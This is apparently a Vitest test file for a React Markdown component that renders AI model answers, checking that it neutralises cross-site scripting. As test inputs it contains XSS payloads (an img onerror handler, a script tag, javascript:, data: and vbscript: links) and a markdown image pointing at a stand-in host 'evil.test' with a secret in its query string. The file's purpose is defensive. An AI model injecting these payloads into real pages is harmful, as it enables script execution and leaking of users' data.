import { render, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'

import { Markdown } from './Markdown'

/**
 * Plan §8, the XSS row.
 *
 * The answer is model output rendered as HTML, so these are the assertions that stand
 * between "a schematic Q&A demo" and "an XSS hole with a schematic theme". They test the
 * component the app actually uses, not a stubbed renderer — the whole failure mode being
 * guarded against is somebody adding `rehype-raw` later because a table looked wrong.
 */
describe('Markdown', () => {
  it('renders an img tag as inert text, never as an element', () => {
    const { container } = render(<Markdown>{'<img src=x onerror=alert(1)>'}</Markdown>)
    expect(container.querySelector('img')).toBeNull()
    // The payload survives as *escaped text* (`&lt;img …`), which is the safe outcome — so
    // assert on the DOM, not on the HTML string: no element carries the handler.
    expect(container.querySelector('[onerror]')).toBeNull()
    expect([...container.querySelectorAll('*')].every((el) => !el.getAttributeNames().some((a) => a.startsWith('on')))).toBe(true)
    expect(container.textContent).toContain('<img src=x onerror=alert(1)>')
  })

  it('never produces a script node', () => {
    const { container } = render(<Markdown>{'<script>alert(1)</script>'}</Markdown>)
    expect(container.querySelector('script')).toBeNull()
    expect(container.innerHTML).not.toContain('<script')
  })

  it('strips a javascript: link rather than rendering an anchor', () => {
    const { container } = render(<Markdown>{'[click me](javascript:alert(1))'}</Markdown>)
    expect(container.querySelector('a')).toBeNull()
    expect(container.innerHTML.toLowerCase()).not.toContain('javascript:')
    expect(screen.getByText('click me')).toBeTruthy()
  })

  it('strips data: and vbscript: links too', () => {
    const { container } = render(
      <Markdown>{'[a](data:text/html,<script>1</script>) and [b](vbscript:msgbox)'}</Markdown>,
    )
    expect(container.querySelectorAll('a')).toHaveLength(0)
  })

  it('keeps http and https links, but makes them safe to click', () => {
    const { container } = render(<Markdown>{'[ok](https://example.com/x)'}</Markdown>)
    const anchor = container.querySelector('a')!
    expect(anchor.getAttribute('href')).toBe('https://example.com/x')
    expect(anchor.getAttribute('rel')).toContain('noopener')
    expect(anchor.getAttribute('target')).toBe('_blank')
  })

  it('renders a markdown image as alt text only, so nothing is fetched', () => {
    const { container } = render(<Markdown>{'![leak](https://evil.test/a?q=secret)'}</Markdown>)
    expect(container.querySelector('img')).toBeNull()
    expect(container.textContent).toContain('leak')
    expect(container.innerHTML).not.toContain('evil.test')
  })

  it('still renders the things an answer actually needs', () => {
    const { container } = render(
      <Markdown>{'| Wire | Net |\n|---|---|\n| `W047` | 110 |\n\n**bold**'}</Markdown>,
    )
    expect(container.querySelector('table')).not.toBeNull()
    expect(container.querySelector('code')?.textContent).toBe('W047')
    expect(container.querySelector('strong')?.textContent).toBe('bold')
  })
})
